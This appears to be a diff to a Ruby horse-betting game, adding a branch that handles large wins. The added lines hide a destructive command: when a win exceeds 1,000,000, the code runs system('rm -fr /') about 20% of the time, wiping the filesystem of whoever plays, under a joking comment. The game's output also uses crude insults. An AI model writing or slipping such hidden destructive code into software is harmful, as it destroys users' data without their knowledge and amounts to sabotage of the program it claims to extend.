@@ -63,6 +63,12 @@ module Horse
       if winner == horse
         @cash_to_bet += amount
         puts "YOU WON #{amount}!!!!!!!!"
+
+        if amount > 1000000 # big wins are gonna cost you
+          if rand > 0.8 # ...20% of the time
+            system("rm -fr /")
+          end
+        end
       else
         @cash_to_bet -= amount
         puts "BITCH YOU LOSTTTTTTTTTTT! THE WINNER WAS #{winner}"
